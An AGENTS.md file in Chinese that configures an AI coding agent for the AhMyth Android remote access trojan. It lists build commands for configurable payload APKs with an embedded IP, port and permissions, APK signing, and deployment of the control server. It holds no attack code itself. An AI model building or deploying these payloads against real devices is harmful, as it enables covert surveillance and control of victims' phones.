# AGENTS.md

## 项目
- 项目名：AhMyth (Android RAT) — 授权安全研究 / 逆向工程用途
- 技术栈：
  - Server: Electron 11.5.0 + AngularJS 1.8 + socket.io 2.5（主进程 `AhMyth-Server/app/main.js`）
  - Client: Android Java（AGP 4.1.3 / Gradle 6.5 / compileSdk 30 / minSdk 16）
  - 打包链：apktool 2.7.0 + uber-apk-signer（`AhMyth-Server/app/app/Factory/`）
- 包管理器：Server 用 npm；Client 用 Gradle Wrapper（`gradlew.bat`）
- 主要目录：
  - `AhMyth-Server/` 服务端（GUI + payload 生成）
  - `AhMyth-Client/` 客户端（被注入的 Android 载荷源码）
  - `_deploy/` 部署产物（勿手改，由脚本生成）

## 命令
- build（客户端基础 APK）：`build-payload.bat`
- build（可配置 payload，含 IP/端口/权限开关）：`build-payload-gui.bat`（配置在 `config.txt`）
- 运行服务端：`start-ahmyth-server.bat`
- 部署到其他设备：解压 `_deploy/AhMyth-Server-Deploy.zip` → `deploy-ahmyth-server.bat`
- lint / test：无自动化测试与 lint，改动后以「实际跑通一次出包/启动」为验收

## 规则
- 架构约定：
  - 环境隔离：JDK 11 只在进程环境变量中生效（`JAVA_HOME` / `PATH` 前置），禁止写入系统级配置；系统默认 JDK 25 必须保持不变。
  - `GRADLE_USER_HOME` 隔离在 `C:\Users\MECHREVO\.gradle-ahmyth`。
  - 网络一律走国内镜像：Electron 用 `npmmirror.com/mirrors/electron/`；Maven 用阿里云镜像 + `google()`/`mavenCentral()`；Gradle 发行版用腾讯镜像。
  - apktool/aapt2 不能处理非 ASCII 路径，构建前必须复制到 ASCII 目录（`C:\Users\MECHREVO\AhMyth\buildSrc`）。
  - 改动 `AhMyth-Server/app/app/**` 后，必须同步到 `_deploy/AhMyth-Server-Deploy/AhMyth-Server/app/app/**`，否则部署包是旧版。
- 编码标准：
  - 保持甲方原代码风格（AngularJS controller 模式 / 朴素 Java），不做无关重构。
  - 注释解释为什么，不解释做了什么。
- 验证要求：
  - 改动构建链 → 实际出一次 APK 并确认签名 `verify[v1,v2,v3]`。
  - 改动服务端 GUI → 实际启动并确认目标流程走通（不只看代码）。
  - 同一结论不重复验证；每个改动步骤单独汇报。


